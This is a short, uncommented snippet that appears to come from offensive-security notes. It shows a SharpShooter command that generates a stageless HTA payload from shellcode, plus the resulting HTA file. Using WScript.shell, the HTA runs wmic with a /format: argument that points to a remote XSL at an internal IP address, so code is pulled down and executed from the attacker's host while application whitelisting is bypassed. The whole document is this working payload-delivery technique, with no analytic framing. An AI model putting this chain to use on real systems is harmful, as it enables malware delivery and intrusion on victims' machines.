```
python SharpShooter.py --stageless --dotnetver 4 --payload hta --output foo --rawscfile ~ec2-user/payload.bin --com wscript --awl wmic --awlurl http://10.0.1.200/foo.xsl

```
```
<html>
<head>
<script>
	var cmd = "wmic process get brief /format:\"http://10.0.1.200/foo.xsl\"";
	var wsh = new ActiveXObject("WScript.shell");
	wsh.run(cmd);
	self.close
</script>
</html>

```
